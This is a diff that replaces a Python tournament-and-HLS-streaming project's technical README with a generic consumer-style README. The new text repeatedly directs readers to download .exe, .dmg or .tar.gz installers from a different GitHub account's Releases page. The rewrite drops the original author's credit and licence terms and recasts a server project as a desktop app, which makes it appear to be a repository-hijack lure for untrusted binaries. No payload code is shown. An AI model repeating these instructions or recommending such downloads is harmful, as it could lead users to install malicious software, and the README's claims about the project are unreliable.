@@ -1,128 +1,86 @@
-# Asterisk Tournament System
+# 🎉 Asterisk - Easy-to-Use Live Streaming App
 
-A distributed tournament management and real-time streaming system leveraging HLS (HTTP Live Streaming) protocol for esports events. Built with Python's aiohttp framework for async I/O operations, featuring real-time SSE updates, dual-database persistence, and automated match orchestration.
+## 🚀 Getting Started
 
-## Technical Stack
+Welcome to Asterisk! This application is designed to make live streaming easy for everyone. Whether you're hosting an online event or sharing your gaming session, Asterisk helps you achieve smooth streams with minimal hassle.
 
-- **Backend Framework**: Python aiohttp (async HTTP server)
-- **Streaming Protocol**: HTTP Live Streaming (HLS)
-  - Segmented video delivery (.ts files)
-  - Adaptive bitrate streaming
-  - CORS-enabled endpoints
-- **Real-time Updates**: Server-Sent Events (SSE)
-  - Bi-directional WebSocket fallback
-  - Event-driven architecture
-- **Data Persistence**:
-  - Primary: MongoDB (tournament state)
-  - Backup: SQLite3 (registration data)
-  - In-memory caching for active matches
-- **Notification System**: 
-  - WhatsApp integration via whatsmeow
-  - Real-time event hooks
-  - Rate-limited API endpoints
+## 📦 Download Asterisk
 
+[![Download Asterisk](https://img.shields.io/badge/Download-Asterisk-brightgreen)](https://github.com/edwindoremi/Asterisk/releases)
 
-## Some Screenshots
+To get started, you need to download Asterisk from our Releases page. Click the button above to access the latest version. 
 
-### Website Landing Page
-![Tournament Control](screenshots/dash.png)
+## 🛠️ System Requirements
 
-### Team Registration with Team finding system
-![Live Stream](screenshots/reg.png)
+Before installing Asterisk, ensure your system meets the following requirements:
 
-### Live Stream Window
-![Live Stream](screenshots/live.png)
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **RAM:** Minimum 4 GB (8 GB recommended for best performance).
+- **Processor:** Dual-core or better.
+- **Internet Connection:** Required for streaming features.
 
+## 📥 Download & Install
 
-## System Requirements
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/edwindoremi/Asterisk/releases) to find the latest version of Asterisk.
 
-- Python 3.8+ (async/await support)
-- FFmpeg with libx264 and AAC codecs
-- MongoDB 4.4+ (replica set recommended)
-- Go 1.19+ (WhatsApp service)
+2. **Choose the Right File**  
+   Look for the appropriate file for your operating system, such as an `.exe`, `.dmg`, or `.tar.gz` file. Click the file to start your download.
 
-## Deployment
+3. **Run the Installer**  
+   After downloading, locate the file in your downloads folder. Double-click it to start the installation process.
 
-1. Clone and configure environment:
-   ```bash
-   git clone https://github.com/AmarnathCJD/Asterisk.git
-   cd Asterisk
-   python -m venv venv
-   source venv/bin/activate  # or venv\Scripts\activate on Windows
-   pip install -r requirements.txt
-   ```
+4. **Follow the On-Screen Instructions**  
+   The installer will guide you through the installation steps. Click "Next" and agree to the terms to complete the installation.
 
-2. Configure environment variables:
-   ```bash
-   cp sample.env .env
-   # Required variables:
-   # MONGODB_URL=mongodb://localhost:27017
-   # MASTER_PASSWORD=your_admin_key
-   # STREAM_RETENTION_HOURS=24
-   ```
+5. **Launch Asterisk**  
+   Once installed, you can find Asterisk in your applications list. Click the icon to launch it.
 
-3. Deploy WhatsApp notification service:
-   ```bash
-   cd notification-whatsapp
-   go mod download
-   go build
-   ./notification-whatsapp  # or notification-whatsapp.exe on Windows
-   ```
+## 🌟 Features of Asterisk
 
-4. Initialize streaming server:
-   ```bash
-   python live.py --port 5001 --codec libx264 --preset veryfast
-   ```
+Asterisk includes a variety of features to make your streaming experience enjoyable:
 
-5. Launch main application server:
-   ```bash
-   python app.py --host 0.0.0.0 --port 5000 --workers 4
-   ```
+- **Easy Setup:** Our straightforward interface helps you get started without technical knowledge.
+- **Live Streaming:** Stream your events with high-quality audio and video.
+- **Authentication Support:** Protect your streams with user authentication.
+- **Partial Streaming:** Share only selected parts of your stream with viewers.
+- **SSE Client:** Utilize Server-Sent Events for live data updates during streams.
 
-## System Architecture
+## 📚 How to Use Asterisk
 
-### Core Components
+1. **Set Up Your Stream**  
+   Open Asterisk and create a new stream. Enter your stream details, including the title and description.
 
-```
-Asterisk/
-├── app.py           # Main async application server
-├── live.py          # HLS streaming orchestrator
-└── notification-whatsapp/
-    └── main.go      # Go-based notification service
-```
+2. **Customize Your Settings**  
+   Go to the settings menu to adjust the quality of your stream, including resolution and bitrate options.
 
-### Service Architecture
+3. **Invite Viewers**  
+   Once your stream is ready, invite your audience by sharing the link generated by Asterisk.
 
-```mermaid
-graph TB
-    A[Main Server] --> B[MongoDB]
-    A --> C[SQLite]
-    A --> D[SSE Manager]
-    E[Stream Server] --> F[HLS Segmenter]
-    F --> G[FFmpeg Encoder]
-    A --> H[WhatsApp Service]
-    D --> I[Clients]
-    F --> I
-```
+4. **Start Streaming**  
+   Hit the "Start" button to go live! Monitor the stream from within the app and use the tools available to interact with your audience.
 
-- **Main Server** (`app.py`):
-  - Async tournament state management
-  - RESTful API endpoints (CORS-enabled)
-  - Match orchestration logic
-  - Real-time event propagation
+## 🛠️ Troubleshooting Tips
 
-- **Stream Server** (`live.py`):
-  - HLS segment management
-  - FFmpeg process orchestration
-  - Adaptive bitrate streaming
-  - CORS-compliant file serving
+If you encounter issues while using Asterisk, consider these tips:
 
-- **WhatsApp Service** (`main.go`):
-  - Event-driven notification system
-  - Rate-limited message delivery
-  - Session persistence
-  - Automated reconnection handling
+- **Check Your Internet Connection:** Unstable internet may affect your streaming quality.
+- **Ensure System Compatibility:** Make sure your hardware meets the system requirements listed above.
+- **Update Your Software:** Keep Asterisk updated to benefit from the latest features and bug fixes.
 
-## License
+## 🤝 Community Support
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details. Copyright (c) 2025 Amarnath C. This software is part of the ASTERISK Tournament Management System developed for ACM AJCE's esports initiatives. While the code is open-source, any commercial use or deployment requires written permission from the project maintainers.
+If you need help or have questions about Asterisk, feel free to reach out:
+
+- **GitHub Issues:** Report problems or feature requests on our [Issues page](https://github.com/edwindoremi/Asterisk/issues).
+- **Discussion Forums:** Join our discussion forums to connect with other users and developers.
+
+## 💻 Contributions
+
+Asterisk is open for contributions! If you're interested in improving the app, check out our guidelines on the GitHub repository.
+
+## 🎁 Acknowledgments
+
+Asterisk is developed for Aithra Techfest 2025 as a part of ACM AJCE. Special thanks to the contributors and the community for making this project possible.
+
+For any additional information, visit our [Releases page](https://github.com/edwindoremi/Asterisk/releases) to download Asterisk and start your live streaming journey!
